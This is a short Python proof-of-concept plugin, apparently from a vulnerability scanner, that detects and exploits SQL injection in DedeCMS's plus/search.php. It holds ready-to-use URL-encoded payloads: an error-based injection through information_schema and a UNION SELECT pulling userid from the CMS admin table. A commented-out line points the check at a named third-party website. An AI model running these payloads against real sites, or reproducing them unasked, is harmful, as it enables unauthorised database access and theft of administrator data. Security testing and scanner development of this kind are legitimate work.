#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'boy'
import requests

def assign(service, arg):
    if service == "dedecms":
        return True, arg

def audit(arg):
    url = arg
    req = requests.get(url + '/plus/search.php?keyword=as&typeArr[uNion]=a', timeout=5)
    if req.status_code == 200:
        if "Safe Alert: Request Error step 1" in req.text:
            payload = "/plus/search.php?keyword=as&typeArr%5B111%3D@%60%5c%27%60%29+and+%28SELECT+1+FROM+%28select+count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select+md5%281%29%29,1,62%29%29%29a+from+information_schema.tables+group+by+a%29b%29%23@%60%5c%27%60+%5D=a";
            req2 = requests.get(url+payload, timeout=5)
            if req2.status_code == 200 and '1c4ca4238a0b923820dcc509a6f75849b' in req2.text:
                return "plus/search.php sqlinject: "+payload
        if 'Safe Alert: Request Error step 2' in req.text:
            payload="/plus%2fsearch.php%3Fkeyword%3Das%26typeArr%5B111%253D@%60%5C%27%60%29%2bUnIon%2bseleCt%2b1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cuserid%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2Cmd5(1)%2C28%2C29%2C30%2C31%2C32%2C33%2C34%2C35%2C36%2C37%2C38%2C39%2C40%2C41%2C42%2bfrom%2b%60%2523@__admin%60%2523@%60%5C%27%60%2b%5D%3Da"
            req2 = requests.get(url + payload, timeout=5)
            if req2.status_code == 200 and '1c4ca4238a0b923820dcc509a6f75849b' in req2.text:
                return "/plus/search.php sqlinject: "+payload
# if __name__ == '__main__':
#     from dummy import *
#     audit(assign('dedecms', 'http://www.hxpp.org.cn/')[1])


class Exploit(object):

    def attack(self, url):
        return audit(url)